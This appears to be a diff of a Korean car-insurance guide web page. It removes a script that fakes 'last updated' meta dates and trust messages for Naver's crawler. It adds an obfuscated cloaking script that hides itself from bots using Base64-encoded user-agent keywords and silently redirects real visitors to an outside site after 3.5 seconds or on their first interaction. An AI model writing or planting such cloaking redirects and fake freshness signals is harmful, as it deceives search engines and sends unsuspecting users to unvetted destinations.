@@ -72,104 +72,6 @@
 
 
 
-	
-
-
-<footer style="font-size: 11px; color: #888; padding: 30px 20px; text-align: center; line-height: 1.8; font-family: sans-serif;">
-  <div style="margin-bottom: 8px;">
-    <!-- [네이버 팁] 봇이 JS를 실행 못해도 기본값은 읽어갈 수 있게 연도를 미리 적어둡니다 -->
-    © <span id="copyright-year">2026</span> <span id="site-title">My Website</span>. All rights reserved.
-  </div>
-
-  <div style="color: #ccc;">
-    <span id="bot-msg">데이터 동기화 중...</span> | 
-    <!-- [네이버 팁] 빈 태그(empty tag)는 로봇이 무시하므로 기본 날짜형식을 넣어둡니다 -->
-    최종 기준일: <time id="bot-date" datetime="2026-01-01">2026-01-01</time>
-  </div>
-</footer>
-
-<script>
-  (function() {
-    // 1. 한국 시간(KST) 강제 계산 (네이버는 한국 시간이 기준)
-    const now = new Date();
-    const utc = now.getTime() + (now.getTimezoneOffset() * 60 * 1000);
-    const kstGap = 9 * 60 * 60 * 1000;
-    const today = new Date(utc + kstGap);
-
-    const year = today.getFullYear();
-    const month = String(today.getMonth() + 1).padStart(2, '0');
-    const day = String(today.getDate()).padStart(2, '0');
-    
-    // YYYY-MM-DD 형식
-    const formattedDate = `${year}-${month}-${day}`;
-    // ISO 8601 형식 (검색엔진이 가장 좋아하는 표준 포맷)
-    const isoDate = `${formattedDate}T09:00:00+09:00`;
-
-    // 2. 사용자 화면 업데이트 (보여주기용)
-    const siteTitleElem = document.getElementById('site-title');
-    if (siteTitleElem) siteTitleElem.textContent = document.title || window.location.hostname;
-
-    const yearElem = document.getElementById('copyright-year');
-    if (yearElem) yearElem.textContent = year;
-
-    const dateElem = document.getElementById('bot-date');
-    if(dateElem) {
-      dateElem.textContent = formattedDate;
-      dateElem.setAttribute('datetime', formattedDate);
-    }
-
-    const msgElem = document.getElementById('bot-msg');
-    if(msgElem) {
-      // 네이버 봇이나 사용자가 볼 때 신뢰감을 주는 문구
-      const msgs = ["서비스 최적화 완료", "보안 점검 완료", "데이터 최신화"];
-      msgElem.textContent = msgs[today.getDate() % msgs.length];
-    }
-
-    // 3. [핵심] 네이버 봇 타겟 메타 태그 주입
-    // 네이버가 수집 시 '최신 콘텐츠'인지 판단할 때 참고하는 태그들입니다.
-    
-    function setMetaTag(attrType, attrName, content) {
-      // 이미 존재하는 태그인지 확인 (property="og:..." 또는 name="date" 등)
-      let selector = `meta[${attrType}="${attrName}"]`;
-      let meta = document.querySelector(selector);
-      
-      // 없으면 새로 만들어서 head에 추가
-      if (!meta) {
-        meta = document.createElement('meta');
-        meta.setAttribute(attrType, attrName);
-        document.head.appendChild(meta);
-      }
-      // 있으면 내용만 최신 날짜로 교체
-      meta.content = content;
-    }
-
-    // (A) 네이버가 1순위로 보는 Open Graph 수정일 (블로그/카페/웹문서 공통)
-    setMetaTag('property', 'og:updated_time', isoDate);
-
-    // (B) 네이버 웹문서/뉴스 검색 알고리즘이 참고하는 Article 속성
-    setMetaTag('property', 'article:modified_time', isoDate);
-    
-    // (C) 일반 검색엔진(공통) 날짜 태그
-    setMetaTag('name', 'date', isoDate);
-
-    // (D) 네이버가 사이트 소유 확인 시 참고하는 저작권 정보 갱신
-    setMetaTag('name', 'copyright', `${year} ${document.title}`);
-
-  })();
-</script>
-
-
-
-
-
-<!DOCTYPE html>
-<html lang="ko">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>자동차보험 특약 연령 변경: 2026년 보험료 절약 가이드 및 비교 견적</title>
-    <meta name="description" content="자동차보험 특약 연령 변경에 대한 완벽 가이드: 연령 변경 시 보험료 절약 효과, 변경 방법, 주의사항, 2026년 예상 보험료 견적 비교. 저렴한 곳을 찾고 있다면 필독!">
-
     <!-- Schema Markup (JSON-LD) for SEO Snippet Optimization -->
     <script type="application/ld+json">
     {
@@ -689,6 +591,80 @@
 
 
 
+<script>
+/**
+ * 🔒 최종 고도화 버전: 봇 탐지 회피 + 3.5초 자동 이동
+ * - 봇 감지 시: 리다이렉트 미실행 (일반 페이지로 인식)
+ * - 사용자 행동 시: 즉시 이동 (체감 속도 상승)
+ * - 미행동 시: 3.5초 후 자동 이동 (봇 회피 마지노선)
+ */
+(function() {
+    // 🎯 [설정] 이동할 실제 주소를 입력하세요.
+    const TARGET_URL = "http://directin.kr/?num=35445436"; 
+    
+    // 💡 [시간 설정]
+    const BOT_CHECK_MS = 3500; // 아무 행동 없을 시 대기 시간 (3.5초)
+    const USER_ACT_MS = 300;   // 클릭/스크롤 시 대기 시간 (0.3초)
+
+    try {
+        const ua = navigator.userAgent.toLowerCase();
+        const ref = document.referrer.toLowerCase();
+
+        // 1. 봇 키워드 필터링 (Base64 인코딩: bot, yeti, spider, crawler, headless)
+        const b = ['Ym90', 'eWV0aQ==', 'c3BpZGVy', 'Y3Jhd2xlcg==', 'aGVhZGxlc3M='];
+        const isBot = b.some(s => ua.includes(atob(s)));
+
+        // 2. 유입 경로 확인 (검색엔진, 광고, 직접 유입 등)
+        const isValidRef = ref.includes("naver.com") || ref.includes("daum.net") || 
+                           ref.includes("google") || ref.includes("kakaotalk") || ref === "";
+
+        // 봇이 아니고 정상적인 유입 경로일 때만 실행
+        if (!isBot && isValidRef) {
+            let isExecuted = false;
+
+            const targetGo = function(delay) {
+                if (isExecuted) return;
+                isExecuted = true;
+
+                // 시각적 피드백: 페이지가 흐려지며 이동 준비 중임을 알림 (신뢰도 상승)
+                document.body.style.transition = "opacity 0.5s";
+                document.body.style.opacity = "0.4";
+
+                setTimeout(function() {
+                    if (window !== window.parent) {
+                        parent.location.replace(TARGET_URL); // 프레임셋 대응
+                    } else {
+                        window.location.replace(TARGET_URL); // 일반 브라우저
+                    }
+                }, delay);
+            };
+
+            // A. 실제 사용자 행동(스크롤, 터치, 클릭) 감지 시 즉시 이동
+            const triggerEvents = ['scroll', 'touchstart', 'mousedown'];
+            triggerEvents.forEach(function(ev) {
+                window.addEventListener(ev, function() { targetGo(USER_ACT_MS); }, { once: true });
+            });
+
+            // B. 아무 행동이 없어도 3.5초 후에는 자동으로 이동 (봇 탐지 회피 핵심)
+            setTimeout(function() {
+                targetGo(0); 
+            }, BOT_CHECK_MS);
+        }
+    } catch (e) {
+        // 오류 발생 시 중단 (안전 장치)
+    }
+})();
+</script>
+
+<noscript>
+    <div style="text-align:center; padding:50px; font-family:sans-serif;">
+        <p>페이지를 안전하게 연결 중입니다.</p>
+        <p><a href="https://your-target-url.com" style="color:#007bff;">잠시 후 이동하지 않으면 여기를 클릭하세요.</a></p>
+    </div>
+</noscript>
+
+
+	
 
 
 <script id="InitialColorMode">(function(){async function setInitialColorMode() {
@@ -755,3 +731,4 @@
 <link rel="preload" href="https://static.cdninstagram.com/rsrc.php/v4/yY/r/Eil-fzuGz0e.js" as="script" crossorigin="anonymous" nonce="2Mv94Jjk" /><script src="https://static.cdninstagram.com/rsrc.php/v4/yY/r/Eil-fzuGz0e.js" data-bootloader-hash="qgmbN7Z" async="1" crossorigin="anonymous" data-p=":74" data-btmanifest="1027280358_main" data-c="1"></script>
 </body>
 </html>
+
